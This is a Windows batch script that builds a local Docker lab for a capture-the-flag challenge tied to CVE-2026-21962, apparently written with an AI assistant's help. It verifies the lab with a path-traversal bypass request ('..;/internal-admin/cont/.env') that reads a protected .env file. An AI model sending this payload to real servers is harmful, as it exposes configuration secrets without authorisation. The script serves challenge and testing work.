@echo off
cd /d C:\SecuritySpace\cve-2026-21962-challenge\cve-2026-21962
set FLAG=WINS{test_1234}

echo ========================================
echo [1/3] build and start - may take minutes
echo ========================================
docker compose up -d --build
if errorlevel 1 goto fail

echo.
echo ========================================
echo [2/3] verify bypass - expect WINS flag
echo ========================================
timeout /t 6 >nul
curl -s --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
echo.

echo ========================================
echo [3/3] save images to tar
echo ========================================
docker save -o C:\SecuritySpace\cve-2026-21962-images.tar cve-2026-21962-ohs-front cve-2026-21962-backend
if errorlevel 1 goto fail
dir C:\SecuritySpace\cve-2026-21962-images.tar | find "images.tar"

echo.
echo ===== DONE - copy this whole window and send to Claude =====
pause
exit /b 0

:fail
echo.
echo [X] a step failed above - copy this whole window and send to Claude
pause
exit /b 1
